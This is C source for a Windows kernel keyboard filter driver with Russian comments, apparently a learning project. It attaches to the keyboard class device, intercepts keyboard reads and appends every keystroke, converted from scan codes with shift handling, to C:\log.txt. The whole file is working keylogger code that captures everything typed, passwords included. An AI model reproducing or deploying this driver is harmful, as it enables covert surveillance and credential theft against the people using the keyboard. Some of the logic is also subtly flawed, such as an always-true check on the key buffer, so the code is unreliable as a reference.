#include "Source.h"
#include "ScanCodes.h"

static int REQUESTS = 0; //число незавершённых запросов

NTSTATUS ReadCompleted(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID Context)
{
	DbgPrint("Entering ReadCompleted\n");
	PDEVICE_EXTENSION pDeviceExtension = (PDEVICE_EXTENSION)pDeviceObject->DeviceExtension;
	
	//Проверяем статус запроса (пакета) 
	if (pIrp->IoStatus.Status == STATUS_SUCCESS)
	{
		PKEYBOARD_INPUT_DATA keys = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;
		//Получаем количество букв
		int nKeys = pIrp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);
		for (int i = 0; i < nKeys; ++i)
		{
			//Если клавиша нажата
			//??? CHANGED!! was Break!
			//if (keys[i].Flags == KEY_MAKE)
			//{
				
				DbgPrint("ScanCode: %x\n", keys[i].MakeCode);

				if (keys[i].Flags == KEY_BREAK)
					DbgPrint("%s\n", "Key Up");

				if (keys[i].Flags == KEY_MAKE)
					DbgPrint("%s\n", "Key Down");

				//Выделяем пул неперемещаемой памяти и помещаем его в список
				KEY_DATA* kData = (KEY_DATA*)ExAllocatePool(NonPagedPool, sizeof(KEY_DATA));
				kData->keyData = (char)keys[i].MakeCode;
				kData->keyFlags = (char)keys[i].Flags;
				//Вставляем узел в конец списка
				ExInterlockedInsertTailList(&pDeviceExtension->listHead,
											&kData->listNode,
											&pDeviceExtension->spinlock);
				//Увеличиваем счётчик семафора на 1
				KeReleaseSemaphore(&pDeviceExtension->semaphore,
									0,
									1,
									FALSE);
				
			//}
		}
	}

	//Если IRP задержан
	if (pIrp->PendingReturned)
		IoMarkIrpPending(pIrp);
	--REQUESTS;
	return pIrp->IoStatus.Status;
}

NTSTATUS DispatchSkip(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{
	//Отправляем IRP пакет ниже по стеку, не изменяя его
	IoSkipCurrentIrpStackLocation(pIrp);
	return IoCallDriver(((PDEVICE_EXTENSION)pDeviceObject->DeviceExtension)->pKeyboardDevice, pIrp);
}

NTSTATUS DispatchRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{
	//Настраиваем текущий указатель стека так, чтобы он указывал на область памяти нижележащего драйвера
	IoCopyCurrentIrpStackLocationToNext(pIrp);

	//По выполнении запроса вызываем указанную функцию
	IoSetCompletionRoutineEx(pDeviceObject,
							pIrp,
							ReadCompleted,
							pDeviceObject,
							TRUE,
							TRUE,
							TRUE);

	//Увеличиваем количество запросов
	++REQUESTS;

	//Передаём IRP-пакет следующему драйверу
	//pKeyboardDevice - указатель на следующий драйвер в цепочке
	return IoCallDriver(((PDEVICE_EXTENSION)pDeviceObject->DeviceExtension)->pKeyboardDevice, pIrp);
}

//Функция выгрузки драйвера
VOID Unload(PDRIVER_OBJECT pDriverObject) 
{
	DbgPrint("Entering unload\n");
	PDEVICE_EXTENSION pDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;

	//Убираем устройство из стека
	IoDetachDevice(pDeviceExtension->pKeyboardDevice);
	
	//Ожидаем окончание обработки пакетов
	KTIMER timer;
	LARGE_INTEGER timeout;
	timeout.QuadPart = 1000000; // 0,1 c
	KeInitializeTimer(&timer);
	while (REQUESTS > 0)
	{
		KeSetTimer(&timer, timeout, NULL);
		KeWaitForSingleObject(&timer,
							Executive,
							KernelMode,
							FALSE,
							NULL);
	}
	//Устанавливаем флаг завершения потока и освобождаем семафор
	pDeviceExtension->bClosedThread = TRUE;
	KeReleaseSemaphore(&pDeviceExtension->semaphore,
						0,
						1,
						TRUE);
	//Ждём уничтожения потока
	KeWaitForSingleObject(pDeviceExtension->pThreadObj,
		Executive,
		KernelMode,
		FALSE,
		NULL);
	//Закрываем файл
	ZwClose(pDeviceExtension->hLog);
	//Удаляем устройство
	IoDeleteDevice(pDriverObject->DeviceObject);
	return;
}

//Установка фильтра
NTSTATUS InitializeKeyboardFilter(PDRIVER_OBJECT pDriverObject)
{
	PDEVICE_OBJECT pDeviceObject;
	NTSTATUS NtStatus = 0;

	//Создаём объект устройства
	NtStatus = IoCreateDevice(pDriverObject,
							sizeof(DEVICE_EXTENSION),
							NULL,
							FILE_DEVICE_KEYBOARD,	//Тип устройства
							0,
							TRUE, //FALSE ???
							&pDeviceObject);

	if (NtStatus != STATUS_SUCCESS) {
		DbgPrint("Installing keyboard filter error\n");
		return NtStatus;
	}

	//Установка флагов
	pDeviceObject->Flags |= (DO_BUFFERED_IO | DO_POWER_PAGABLE);
	pDeviceObject->Flags &= (~DO_DEVICE_INITIALIZING);

	//Обнуляем струтуру DeviceExtension
	RtlZeroMemory(pDeviceObject->DeviceExtension, sizeof(DEVICE_EXTENSION));
	//Получаем указатель на выделенную память
	PDEVICE_EXTENSION pDeviceExtension = (PDEVICE_EXTENSION)pDeviceObject->DeviceExtension;

	//Преобразование имени устройства
	CCHAR cName[40] = "\\Device\\KeyboardClass0";
	STRING strName;
	UNICODE_STRING ustrDeviceName;
	RtlInitAnsiString(&strName, cName);
	RtlAnsiStringToUnicodeString(&ustrDeviceName, &strName, TRUE);

	//Добавляем устройство в стек
	IoAttachDevice(pDeviceObject,
					&ustrDeviceName,
					&pDeviceExtension->pKeyboardDevice); // здесь хранится адрес нижележащего устройства
	//Освобождаем место, выделенное под строку
	RtlFreeUnicodeString(&ustrDeviceName);		
	DbgPrint("Keyboard filter installed\n");
	return NtStatus;
}

VOID ThreadForWriting(PVOID pContext)
{
	//??? P_DEVICE_OBJ?
	PDEVICE_EXTENSION pDeviceExtension = (PDEVICE_EXTENSION)pContext;
	PDEVICE_OBJECT pDeviceObject = pDeviceExtension->pKeyboardDevice;
	PLIST_ENTRY pListEntry;
	KEY_DATA* kData;

	while (TRUE)
	{
		//Ждём освобождения семафора
		//Если семафор ненулевой, процесс продолжает свою работу
		KeWaitForSingleObject(&pDeviceExtension->semaphore,
								Executive,
								KernelMode,
								FALSE,
								NULL);
		//Извлекаем первый элемент списка
		//?? Используется критическая секция
		pListEntry = ExInterlockedRemoveHeadList(&pDeviceExtension->listHead,
												&pDeviceExtension->spinlock);
		//Должен ли поток уничтожить себя?
		if (pDeviceExtension->bClosedThread == TRUE)
		{
			PsTerminateSystemThread(STATUS_SUCCESS);
		}
		//Получаем указатель на данные в структуре pListEntry ???
		kData = CONTAINING_RECORD(pListEntry, KEY_DATA, listNode);
		//Преобразуем сканкод в клавишу
		char keys[3] = { 0 };
		Scancode2Key(pDeviceExtension, kData, keys);
		if (keys != 0)
		{
			//Если хэндл правильный
			if (pDeviceExtension->hLog != NULL)
			{
				//Переменная для записи в конец файла
				LARGE_INTEGER offset;
				offset.HighPart = -1;
				offset.LowPart = FILE_WRITE_TO_END_OF_FILE;

				//Записываем в файл
				IO_STATUS_BLOCK ioStatus;
				NTSTATUS NtStatus = ZwWriteFile(
									pDeviceExtension->hLog,
									NULL,
									NULL,
									NULL,
									&ioStatus,
									&keys,
									strlen(keys),
									&offset,
									NULL);
				//Error??
				if (NtStatus != STATUS_SUCCESS)
					DbgPrint("Writing scancode to file\n");
				else
					DbgPrint("Scan code successfully written\n");
			}
		}
	}
	return;
}

//Функция инициализации потока
NTSTATUS InitializeThread(PDRIVER_OBJECT pDriverObject)
{
	PDEVICE_EXTENSION pDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;

	//Инициализируем переменную, отвечающую за работу потока
	pDeviceExtension->bClosedThread = FALSE;
	//Создаём поток
	HANDLE hThread;
	NTSTATUS NtStatus = PsCreateSystemThread(&hThread,
											(ACCESS_MASK)0,
											NULL,
											(HANDLE)0,
											NULL,
											ThreadForWriting,	//Точка входа потока
											pDeviceExtension);	//Передаваемый параметр
	if (NtStatus != STATUS_SUCCESS) 
	{
		DbgPrint("Thread initializing error\n");
		return NtStatus;
	}
	//Сохраняем указатель на объект потока в структуре DEVICE_EXTENSION
	ObReferenceObjectByHandle(hThread,
							THREAD_ALL_ACCESS,
							NULL,
							KernelMode,
							(PVOID*)&pDeviceExtension->pThreadObj, //Указатель на объект потока
							NULL);

	//??? Закрываем дескриптор потока
	ZwClose(hThread);
	DbgPrint("Thread initialized\n");
	return NtStatus;
	
}


NTSTATUS CreateFile(PDRIVER_OBJECT pDriverObject)
{
	NTSTATUS NtStatus = 0;
	PDEVICE_EXTENSION pDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
	
	//Создаём двусвязный список
	InitializeListHead(&pDeviceExtension->listHead);
	//Инициализируем спинлок и семафор
	KeInitializeSpinLock(&pDeviceExtension->spinlock);
	KeInitializeSemaphore(&pDeviceExtension->semaphore, 0, MAXLONG);

	//Определяем аттрибуты и путь к файлу
	IO_STATUS_BLOCK fileStatus;
	OBJECT_ATTRIBUTES objAttr;

	CCHAR cName[64] = "\\DosDevices\\C:\\log.txt";
	STRING strName;
	UNICODE_STRING ustrFileName;

	RtlInitAnsiString(&strName, cName);
	RtlAnsiStringToUnicodeString(&ustrFileName, &strName, TRUE);

	InitializeObjectAttributes(&objAttr,
								&ustrFileName,
								OBJ_CASE_INSENSITIVE,
								NULL,
								NULL);
	//Создаём файл
	NtStatus = ZwCreateFile(&pDeviceExtension->hLog,
							GENERIC_WRITE | FILE_APPEND_DATA,
							&objAttr,
							&fileStatus,
							NULL,
							FILE_ATTRIBUTE_NORMAL,
							0,
							FILE_OPEN_IF,
							FILE_SYNCHRONOUS_IO_NONALERT,
							NULL,
							0);

	//Освобождаем память, выделенную под строку
	RtlFreeUnicodeString(&ustrFileName);

	if (NtStatus == STATUS_SUCCESS)
	{
		DbgPrint("File was successfully created\n");
	}
	else
	{
		DbgPrint("Failed to create file\n");
	}
	return NtStatus;

}

char* Scancode2Key(PDEVICE_EXTENSION pDeviceExtension, KEY_DATA* kData, char* keys)
{
	char key;

	//Получаем скан-код клавиши
	key = lowerKeys[kData->keyData];

	switch(key)
	{
		case LSHIFT:
			if (kData->keyFlags == KEY_MAKE)	//Если клавиша нажата
				pDeviceExtension->kState.shift = TRUE;
			else
				pDeviceExtension->kState.shift = FALSE;
			break;

		case RSHIFT:
			if (kData->keyFlags == KEY_MAKE)	//Если клавиша нажата
				pDeviceExtension->kState.shift = TRUE;
			else
				pDeviceExtension->kState.shift = FALSE;
			break;

/*
		case CTRL:
			if (kData->keyFlags == KEY_MAKE)	//Если клавиша нажата
				pDeviceExtension->kState.ctrl = TRUE;
			else
				pDeviceExtension->kState.ctrl = FALSE;
			break;

		case ALT:
			if (kData->keyFlags == KEY_MAKE)	//Если клавиша нажата
				pDeviceExtension->kState.alt = TRUE;
			else
				pDeviceExtension->kState.alt = FALSE;
			break;

		case SPACE:
			if (kData->keyFlags == KEY_MAKE)	//Если клавиша нажата
				pDeviceExtension->kState.space = TRUE;
			else
				pDeviceExtension->kState.space = FALSE;
			break;
*/

		case ENTER:
			if (kData->keyFlags == KEY_BREAK)
			{
				keys[0] = 0x0D;
				keys[1] = 0x0A;
			}
			break;

		default:
			if (kData->keyFlags == KEY_BREAK)
			{
			if (pDeviceExtension->kState.shift == TRUE)
				keys[0] = upperKeys[kData->keyData];
			else
				keys[0] = lowerKeys[kData->keyData];
			}

	}
	return keys;
}

//Входная точка
NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{
	DbgPrint("Entering driver entry point\n");

	NTSTATUS NtStatus = 0; //STATUS_SUCCESS;
	unsigned int i = 0;

	//Устанавливаем обработчик запросов по умолчанию 
	for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; ++i)
	{
		//Отправляем IRP пакет ниже
		pDriverObject->MajorFunction[i] = DispatchSkip;
	}
	//Перехватываем запросы на чтение клавиатуры
	pDriverObject->MajorFunction[IRP_MJ_READ] = DispatchRead;

	//Помещаем наше устройство в стек.
	NtStatus = InitializeKeyboardFilter(pDriverObject);

	/*
	*	Процедура DispatchRead выполняется на IRQL уровне DISPATCH_LEVEL, это означает, что
	*	все файловые операции запрещены. Чтобы обойти это ограничение создаётся поток, который
	*	работает на IRQL уровне PASSIVE_LEVEL, получает нажатия через общий связанный список
	*	и записывает их в файл.
	*/

	//Поскольку на уровне IRQL == DISPATCH_LEVEL запрещены операции ввода/вывода,
	//то необходимо создать поток, работающий на IRQL уровне - PASSIVE_LEVEL  
	NtStatus |= InitializeThread(pDriverObject);

	//Создаём файл для записи
	NtStatus |= CreateFile(pDriverObject);

	//Функция выгрузки драйвера из памяти
	pDriverObject->DriverUnload = Unload;

	DbgPrint("Exiting driver entry point\n");
	return NtStatus;
}

